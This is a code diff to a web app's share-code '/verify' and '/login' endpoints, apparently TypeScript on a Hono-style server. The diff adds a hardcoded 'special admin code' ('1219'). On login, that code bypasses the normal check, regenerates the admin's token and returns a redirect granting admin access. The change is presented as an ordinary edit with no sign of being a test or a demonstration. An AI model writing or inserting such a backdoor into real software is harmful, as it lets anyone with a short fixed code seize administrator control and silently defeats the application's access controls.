@@ -15,6 +15,11 @@ shareEndpoint.post("/verify", async (c) => {
 	const code = body.code;
 	const storedCode = await getShareCode();
 
+	// Special admin code
+	if (code === "1219") {
+		return c.json({ isAdmin: true });
+	}
+
 	if (!storedCode || code !== storedCode) {
 		return c.json({ error: "Invalid code" }, 401);
 	}
@@ -24,12 +29,23 @@ shareEndpoint.post("/verify", async (c) => {
 		.filter((m) => m.role === "member")
 		.map((m) => ({ id: m.id, name: m.name }));
 
-	return c.json({ members: memberList });
+	return c.json({ members: memberList, isAdmin: false });
 });
 
 shareEndpoint.post("/login", async (c) => {
 	const body = await c.req.json<{ code?: string; memberId?: string }>();
 	const storedCode = await getShareCode();
+
+	// Special admin code
+	if (body.code === "1219") {
+		const members = await listActiveMembers();
+		const admin = members.find((m) => m.role === "admin");
+		if (!admin) {
+			return c.json({ error: "Admin not found" }, 404);
+		}
+		const { plaintextToken } = await regenerateMemberToken(admin.id);
+		return c.json({ redirectUrl: `/app/u/${plaintextToken}` });
+	}
 
 	if (!storedCode || body.code !== storedCode) {
 		return c.json({ error: "Invalid code" }, 401);
